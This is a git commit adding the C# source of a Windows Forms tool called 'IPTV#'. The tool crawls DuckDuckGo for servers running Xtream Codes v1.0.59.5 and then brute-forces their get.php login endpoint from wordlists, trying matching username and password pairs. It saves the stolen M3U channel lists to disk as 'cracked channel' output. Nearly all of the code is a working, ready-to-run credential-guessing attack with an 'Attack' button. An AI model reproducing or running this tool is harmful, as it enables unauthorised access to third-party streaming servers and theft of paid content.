10e4b4fbf444b7165484f7bc7772b5495a4c621e
Armax <marcocuci@gmail.com>
2016-02-04 21:00:41 +0100

    First
    YO

---
+++ IPTV Sharp/Form1.Designer.cs
@@ -0,0 +1,126 @@
+﻿namespace IPTV_Sharp
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.comboBox1 = new System.Windows.Forms.ComboBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.splitter1 = new System.Windows.Forms.Splitter();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // comboBox1
+            // 
+            this.comboBox1.FormattingEnabled = true;
+            this.comboBox1.Location = new System.Drawing.Point(98, 12);
+            this.comboBox1.Name = "comboBox1";
+            this.comboBox1.Size = new System.Drawing.Size(620, 33);
+            this.comboBox1.TabIndex = 0;
+            this.comboBox1.Visible = false;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(12, 15);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(80, 25);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Target:";
+            this.label1.Visible = false;
+            // 
+            // splitter1
+            // 
+            this.splitter1.Location = new System.Drawing.Point(0, 0);
+            this.splitter1.Name = "splitter1";
+            this.splitter1.Size = new System.Drawing.Size(3, 129);
+            this.splitter1.TabIndex = 2;
+            this.splitter1.TabStop = false;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(745, 8);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(110, 48);
+            this.button1.TabIndex = 3;
+            this.button1.Text = "Attack";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Visible = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.Location = new System.Drawing.Point(634, 104);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(232, 25);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "Developed by @Arm4x";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(22, 89);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(310, 25);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Crawling servers, please wait...";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(867, 129);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.splitter1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.comboBox1);
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "IPTV#";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ComboBox comboBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Splitter splitter1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+    }
+}
+
---
+++ IPTV Sharp/Form1.cs
@@ -0,0 +1,123 @@
+﻿using HtmlAgilityPack;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Windows.Forms;
+using System.IO;
+using System.Net;
+using System.Threading;
+
+namespace IPTV_Sharp
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void crack(String server, String list)
+        {
+            int p = 0;
+            string line;
+
+            StreamReader file = new StreamReader(list);
+            while ((line = file.ReadLine()) != null)
+            {
+                string url = server + "/get.php?username=" + line + "&password=" + line + "&type=m3u&output=mpegts";
+                string output = "output/tv_channels_" + line + ".m3u";
+
+                using (WebClient client = new WebClient())
+                {
+                    string page = client.DownloadString(url);
+                    if(page != "")
+                    {
+                        using (StreamWriter outputFile = new StreamWriter(output, true))
+                        {
+                            outputFile.WriteLine(page);
+                        }
+                    }
+                }
+                p++;
+            }
+
+            file.Close();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+            string url = "https://duckduckgo.com/html/?q=Xtream+Codes+v1.0.59.5&kl=it-it";
+            string[] banned = { "pastie", "pastebin", "facebook", "github", "twitter", "google", "bing", "yahoo", "amazon" };
+            var servers = new List<string>();
+
+            HtmlWeb crawler = new HtmlWeb();
+            HtmlAgilityPack.HtmlDocument doc = crawler.Load(url);
+
+            foreach (HtmlNode link in doc.DocumentNode.SelectNodes("//a[@href]"))
+            {
+                HtmlAttribute att = link.Attributes["href"];
+
+                if (!banned.Any(att.Value.Contains))
+                {
+                    if (att.Value.Contains("http://"))
+                    {
+                        string[] temp = att.Value.Split('/');
+                        string tempx = temp[0] + "//" + temp[2];
+                        if (!servers.Any(tempx.Contains))
+                        {
+                            servers.Add(tempx);
+                            comboBox1.Items.Add(tempx);
+                        }
+                    }
+                }     
+            }
+
+
+            label3.Visible = false;
+            label1.Visible = true;
+            comboBox1.Visible = true;
+            button1.Visible = true;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            string[] lists = { "part_list/a.txt", "part_list/b.txt", "part_list/c.txt", "part_list/d.txt", "part_list/e.txt", "part_list/f.txt", "part_list/g.txt", "part_list/i.txt", "part_list/l.txt", "part_list/m.txt", "part_list/n.txt", "part_list/o.txt", "part_list/p.txt", "part_list/r.txt", "part_list/s.txt", "part_list/u.txt", "part_list/z.txt" };
+
+            if (comboBox1.Text == "")
+            {
+                MessageBox.Show("You must select a target.", "No target", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+            }
+            else
+            {
+                string server = comboBox1.Text;
+                label3.Text = "Attack in progress, check output directory for cracked channel";
+                label3.Visible = true;
+                label1.Enabled = false;
+                comboBox1.Enabled = false;
+                button1.Enabled = false;
+
+                int x = 0;
+                Thread[] threads = new Thread[17];
+
+                foreach (String list in lists)
+                {
+                    threads[x] = new Thread(() => crack(server, list));
+                    threads[x].Start();
+                }
+
+                foreach(Thread thread in threads)
+                {
+                    thread.Join();
+                }
+
+                MessageBox.Show("Done!", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+
+                label3.Visible = false;
+                label1.Enabled = true;
+                comboBox1.Enabled = true;
+                button1.Enabled = true;
+            }
+        }
+    }
+}
